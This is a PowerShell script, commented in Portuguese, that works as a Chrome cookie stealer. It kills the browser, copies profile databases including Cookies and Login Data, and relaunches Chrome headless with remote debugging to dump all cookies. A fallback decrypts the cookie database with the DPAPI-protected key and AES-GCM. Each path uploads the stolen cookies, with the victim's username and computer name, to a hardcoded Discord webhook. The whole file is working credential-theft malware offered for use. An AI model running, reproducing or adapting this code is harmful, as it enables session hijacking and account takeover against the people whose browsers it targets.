param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9")

function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }

# ============================================
# MÉTODO: Chrome Debug COM BANCO REAL COPIADO
# ============================================
l "=== Chrome v20 Extractor ==="
l "User: $env:USERNAME@$env:COMPUTERNAME"

$realUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
l "[*] User Data: $realUserData"

# Mata Chrome
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Cria diretório temp para o perfil Chrome debug
$tempProfile = "$env:TEMP\chrome_debug_" + (Get-Random -Max 99999)
New-Item -ItemType Directory -Path $tempProfile -Force | Out-Null

# Copia TODOS os bancos de dados do perfil Default (e Profile 1, 2...)
$profilesToCopy = @('Default','Profile 1','Profile 2','Profile 3','Profile 4')
$copiedProfiles = @()

foreach ($prof in $profilesToCopy) {
    $srcDir = Join-Path $realUserData $prof
    $dstDir = Join-Path $tempProfile $prof
    
    if (Test-Path $srcDir) {
        New-Item -ItemType Directory -Path $dstDir -Force | Out-Null
        
        # Copia só os bancos de dados + arquivos essenciais
        foreach ($file in @('Cookies','Cookies-journal','Login Data','Login Data-journal','Web Data','Web Data-journal','Bookmarks','Preferences')) {
            $srcFile = Join-Path $srcDir $file
            $dstFile = Join-Path $dstDir $file
            if (Test-Path $srcFile) {
                Copy-Item $srcFile $dstFile -Force -ErrorAction SilentlyContinue
            }
        }
        $copiedProfiles += $prof
        l "[COPY] Perfil $prof copiado"
    }
}

# Copia também o Local State (necessário para o Chrome)
$srcLocalState = Join-Path $realUserData 'Local State'
$dstLocalState = Join-Path $tempProfile 'Local State'
if (Test-Path $srcLocalState) {
    Copy-Item $srcLocalState $dstLocalState -Force
    l "[COPY] Local State copiado"
}

l "[*] Perfis copiados: $($copiedProfiles -join ', ')"
l "[*] Iniciando Chrome com debug no perfil copiado..."

$chromeExe = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
if (!(Test-Path $chromeExe)) { $chromeExe = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
if (!(Test-Path $chromeExe)) { $chromeExe = "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe" }

$port = 9222

try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $chromeExe
    $psi.Arguments = "--remote-debugging-port=$port --remote-allow-origins=* --headless --user-data-dir=$tempProfile --no-first-run --disable-features=ChromeWhatsNewUI --disable-sync --no-default-browser-check --disable-translate"
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    $proc = [System.Diagnostics.Process]::Start($psi)
    
    Start-Sleep -Seconds 4
    
    # Conecta no WebSocket
    $wsUrl = $null
    for ($attempt = 0; $attempt -lt 10; $attempt++) {
        try {
            $resp = Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 3
            $wsUrl = $resp.webSocketDebuggerUrl
            if ($wsUrl) { break }
        } catch {}
        Start-Sleep -Seconds 1
    }
    
    if (!$wsUrl) {
        try {
            $list = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 3
            if ($list -and $list.Count -gt 0 -and $list[0].webSocketDebuggerUrl) {
                $wsUrl = $list[0].webSocketDebuggerUrl
            }
        } catch {}
    }
    
    if (!$wsUrl) {
        l "[ERRO] Nao foi possivel conectar ao Chrome Debug"
        throw "No WebSocket URL"
    }
    
    l "[WS] Conectado: $($wsUrl.Substring(0, 50))..."
    
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)
    $ws.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
    
    # Network.getAllCookies
    $msg = '{"id":1,"method":"Network.getAllCookies"}'
    $ws.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($msg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
    
    $buf = [byte[]]::new(524288)
    $res = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buf), [System.Threading.CancellationToken]::None).Result
    $respStr = [System.Text.Encoding]::UTF8.GetString($buf, 0, $res.Count)
    
    $ws.Dispose()
    
    $json = $respStr | ConvertFrom-Json
    $allCookies = @()
    if ($json.result -and $json.result.cookies) {
        $allCookies = $json.result.cookies
    }
    
    l "[OK] Network.getAllCookies retornou $($allCookies.Count) cookies"
    
    if ($allCookies.Count -gt 0) {
        $cc = $allCookies | ConvertTo-Json -Depth 3
        
        # Envia Discord
        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
        $body = @()
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="payload_json"'
        $body += ""
        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Metodo: Chrome Debug"}')
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $cc
        $body += "--$boundary--"
        
        $bodyStr = $body -join "`r`n"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[DISCORD] Cookies enviados!"
        
        $out = "$env:TEMP\chrome_extracted"
        if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
        $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
        l "[SALVO] $out\cookies.json"
        l "=== CONCLUIDO ==="
        
        # Cleanup
        if ($proc -and !$proc.HasExited) { $proc.Kill() }
        Start-Sleep -Seconds 1
        if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
        return
    }
    
    # Se não veio cookies via getAllCookies, tenta via Storage
    l "[*] Nenhum cookie via getAllCookies. Tentando Storage.getCookies..."
    
    # Tenta abrir uma pagina para forçar o Chrome a carregar os cookies
    $ws2 = New-Object System.Net.WebSockets.ClientWebSocket
    $ws2.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
    
    # Cria um target (aba) primeiro
    $newTargetMsg = '{"id":2,"method":"Target.createTarget","params":{"url":"about:blank"}}'
    $ws2.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($newTargetMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
    
    $buf2 = [byte[]]::new(524288)
    $res2 = $ws2.ReceiveAsync([System.ArraySegment[byte]]::new($buf2), [System.Threading.CancellationToken]::None).Result
    $targetResp = [System.Text.Encoding]::UTF8.GetString($buf2, 0, $res2.Count)
    $ws2.Dispose()
    
    # Pega o targetId e conecta nele
    $targetJson = $targetResp | ConvertFrom-Json
    if ($targetJson.result -and $targetJson.result.targetId) {
        $targetId = $targetJson.result.targetId
        l "[TARGET] Target ID: $targetId"
        
        # Conecta no target específico
        $targetWsUrl = "ws://127.0.0.1:$port/devtools/page/$targetId"
        
        $ws3 = New-Object System.Net.WebSockets.ClientWebSocket
        $ws3.ConnectAsync([System.Uri]$targetWsUrl, [System.Threading.CancellationToken]::None).Wait()
        
        # Habilita Network
        $enableMsg = '{"id":1,"method":"Network.enable"}'
        $ws3.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($enableMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        Start-Sleep -Milliseconds 500
        
        # Pega cookies da página
        $cookiesMsg = '{"id":2,"method":"Network.getCookies"}'
        $ws3.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($cookiesMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
        
        $buf3 = [byte[]]::new(524288)
        $res3 = $ws3.ReceiveAsync([System.ArraySegment[byte]]::new($buf3), [System.Threading.CancellationToken]::None).Result
        $cookiesResp = [System.Text.Encoding]::UTF8.GetString($buf3, 0, $res3.Count)
        $ws3.Dispose()
        
        $cookiesJson = $cookiesResp | ConvertFrom-Json
        if ($cookiesJson.result -and $cookiesJson.result.cookies) {
            $allCookies = $cookiesJson.result.cookies
            l "[OK] Network.getCookies retornou $($allCookies.Count) cookies"
        }
    }
    
    if ($allCookies.Count -gt 0) {
        $cc = $allCookies | ConvertTo-Json -Depth 3
        
        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
        $body = @()
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="payload_json"'
        $body += ""
        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Metodo: Chrome Debug"}')
        $body += "--$boundary"
        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
        $body += "Content-Type: application/json"
        $body += ""
        $body += $cc
        $body += "--$boundary--"
        
        $bodyStr = $body -join "`r`n"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $wc.UploadData($w, "POST", $bytes) | Out-Null
        $wc.Dispose()
        l "[DISCORD] Cookies enviados!"
        
        $out = "$env:TEMP\chrome_extracted"
        if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
        $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
        l "[SALVO] $out\cookies.json"
    } else {
        l "[FALHA] Chrome Debug retornou 0 cookies mesmo com banco copiado"
        l "[*] Tentando decrypt via DB como fallback..."
        
        # === FALLBACK: tentar decrypt via DB ===
        $json = Get-Content (Join-Path $realUserData "Local State") -Raw | ConvertFrom-Json
        $ek = $json.os_crypt.encrypted_key
        $ak = $json.os_crypt.app_bound_encrypted_key
        
        # Tenta DPAPI normal
        if ($ek) {
            $raw = [Convert]::FromBase64String($ek)
            if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
                try {
                    $d = $raw[5..($raw.Length-1)]
                    $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($d, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    if ($mk.Length -ge 32) {
                        $mk = $mk[0..31]
                        l "[FALLBACK] DPAPI v10 funcionou!"
                        
                        # Descriptografa cookies do banco copiado
                        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction SilentlyContinue
                        $allDecCookies = @()
                        
                        foreach ($prof in $copiedProfiles) {
                            $cookiesDb = Join-Path $tempProfile "$prof\Cookies"
                            if (Test-Path $cookiesDb) {
                                try {
                                    $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$cookiesDb")
                                    $conn.Open()
                                    $cmd = $conn.CreateCommand()
                                    $cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies"
                                    $reader = $cmd.ExecuteReader()
                                    while ($reader.Read()) {
                                        $eb = $reader["encrypted_value"]
                                        if ($eb -is [string]) { continue }
                                        $ebArr = [byte[]]$eb
                                        if ($ebArr.Length -ge 15) {
                                            try {
                                                if ($ebArr[0] -eq 2 -or $ebArr[0] -eq 3) {
                                                    $n=$ebArr[3..14]; $cl=$ebArr.Length-15-16
                                                    if ($cl -gt 0) {
                                                        $c=$ebArr[15..(15+$cl-1)]; $t=$ebArr[(15+$cl)..($ebArr.Length-1)]
                                                        $a=[System.Security.Cryptography.AesGcm]::new($mk,16)
                                                        $r=[byte[]]::new($cl)
                                                        $a.Decrypt($n,$c,$t,$r)
                                                        $a.Dispose()
                                                        $val = [System.Text.Encoding]::UTF8.GetString($r)
                                                        $allDecCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"]}
                                                    }
                                                } elseif ($ebArr[0] -eq 1) {
                                                    $c=$ebArr[3..($ebArr.Length-1)]
                                                    $d=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                                                    $val=[System.Text.Encoding]::UTF8.GetString($d)
                                                    $allDecCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"]}
                                                }
                                            } catch {}
                                        }
                                    }
                                    $reader.Close(); $conn.Close()
                                } catch { l "[DB] Erro: $_" }
                            }
                        }
                        
                        if ($allDecCookies.Count -gt 0) {
                            l "[FALLBACK] $($allDecCookies.Count) cookies descriptografados via DB!"
                            $cc = $allDecCookies | ConvertTo-Json -Depth 3
                            
                            $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
                            $body = @()
                            $body += "--$boundary"
                            $body += 'Content-Disposition: form-data; name="payload_json"'
                            $body += ""
                            $body += ('{"content":"Chrome v20 FALLBACK | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allDecCookies.Count + ' | Metodo: DPAPI decrypt"}')
                            $body += "--$boundary"
                            $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
                            $body += "Content-Type: application/json"
                            $body += ""
                            $body += $cc
                            $body += "--$boundary--"
                            
                            $bodyStr = $body -join "`r`n"
                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
                            $wc = New-Object System.Net.WebClient
                            $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
                            $wc.UploadData($w, "POST", $bytes) | Out-Null
                            $wc.Dispose()
                            l "[DISCORD] Cookies enviados via fallback DB!"
                            
                            $out = "$env:TEMP\chrome_extracted"
                            if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
                            $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
                            l "[SALVO] $out\cookies.json"
                        } else {
                            l "[FALHA] Nenhum cookie descriptografado via DB"
                        }
                    }
                } catch { l "[FALLBACK] DPAPI falhou: $_" }
            }
        }
    }
    
    # Cleanup
    if ($proc -and !$proc.HasExited) { $proc.Kill() }
    Start-Sleep -Seconds 1
    if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
    
} catch {
    l "[ERRO] $($_.Exception.Message)"
    if ($proc -and !$proc.HasExited) { $proc.Kill() }
    if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
}

l "=== CONCLUIDO ==="
